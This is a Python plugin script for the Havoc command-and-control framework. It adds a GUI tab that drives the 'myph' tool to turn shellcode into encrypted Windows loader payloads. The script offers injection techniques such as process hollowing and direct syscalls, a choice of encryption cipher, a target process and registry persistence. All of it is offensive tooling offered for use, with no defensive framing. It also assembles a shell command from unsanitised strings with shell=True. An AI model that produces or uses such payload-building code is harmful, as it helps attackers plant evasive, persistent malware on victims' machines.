#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Alternative Myph Loader for Havoc C2

import os
import shutil
import subprocess
import havoc  
import havocui  

# Initial configurations and global variables
MYPH_LOADER_PATH = shutil.which("myph")
DEFAULT_SHELLCODE_PATH = "/path/to/your/shellcode.bin"  # Adjust with your actual shellcode path
DEFAULT_OUTPUT_PATH = "/tmp/myph"  # Adjust as needed
shellcode_execution_technique = "CRT"
shellcode_encryption_method = "AES"
encryption_key = ""  # Leave empty for auto-generation
target_process = "cmd.exe"
persistence_reg_key = ""

if not MYPH_LOADER_PATH:
    print("[-] myph loader not found in $PATH. Please install myph.")
else:
    print("[+] myph loader found at:", MYPH_LOADER_PATH)

# Update functions
def update_shellcode_path():
    global DEFAULT_SHELLCODE_PATH
    DEFAULT_SHELLCODE_PATH = havocui.openfiledialog("Select Shellcode").decode("utf-8")

def update_shellcode_execution_technique(index):
    global shellcode_execution_technique
    techniques = ["CRT", "CRTx", "CreateFiber", "ProcessHollowing", "CreateThread", "EnumCalendarInfoA", "Syscall", "Etwp"]
    shellcode_execution_technique = techniques[index]

def update_shellcode_encryption_method(index):
    global shellcode_encryption_method
    methods = ["AES", "chacha20", "blowfish"]
    shellcode_encryption_method = methods[index]

def update_encryption_key(text):
    global encryption_key
    encryption_key = text

def update_target_process(text):
    global target_process
    target_process = text

def update_persistence_reg_key(text):
    global persistence_reg_key
    persistence_reg_key = text

# Generate the payload
def generate_myph_payload():
    cmd = get_build_command()
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"[+] Payload generated successfully at {DEFAULT_OUTPUT_PATH}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to generate payload: {e}")

def get_build_command() -> str:
    cmd = f'{MYPH_LOADER_PATH} --shellcode "{DEFAULT_SHELLCODE_PATH}" --out "{DEFAULT_OUTPUT_PATH}"'
    cmd += f' --technique {shellcode_execution_technique} --encryption {shellcode_encryption_method}'
    if encryption_key:
        cmd += f' --key {encryption_key}'
    cmd += f' --process "{target_process}"'
    if persistence_reg_key:
        cmd += f' --persistence "{persistence_reg_key}"'
    return cmd

# UI generator function
def myph_loader_generator():
    dialog = havocui.Dialog("Myph Payload Generator", True, 670, 400)
    
    dialog.addLabel("Shellcode Path:")
    dialog.addButton("Select Shellcode", update_shellcode_path)
    
    dialog.addLabel("Shellcode Execution Technique:")
    techniques = ["CRT", "CRTx", "CreateFiber", "ProcessHollowing", "CreateThread", "EnumCalendarInfoA", "Syscall", "Etwp"]
    dialog.addCombobox(update_shellcode_execution_technique, *techniques)
    
    dialog.addLabel("Shellcode Encryption Method:")
    methods = ["AES", "chacha20", "blowfish"]
    dialog.addCombobox(update_shellcode_encryption_method, *methods)
    
    dialog.addLabel("Encryption Key (Leave empty for auto-generation):")
    dialog.addLineedit("", update_encryption_key)
    
    dialog.addLabel("Target Process:")
    dialog.addLineedit("cmd.exe", update_target_process)
    
    dialog.addLabel("Persistence Reg Key (optional):")
    dialog.addLineedit("", update_persistence_reg_key)
    
    dialog.addButton("Generate Payload", generate_myph_payload)
    dialog.exec()

# Add a tab in Havoc C2 for this script
havocui.createtab("| Myph |", "myph loader", myph_loader_generator)

print("[*] Myph Loader script loaded. Use the 'Myph' tab in Havoc.")
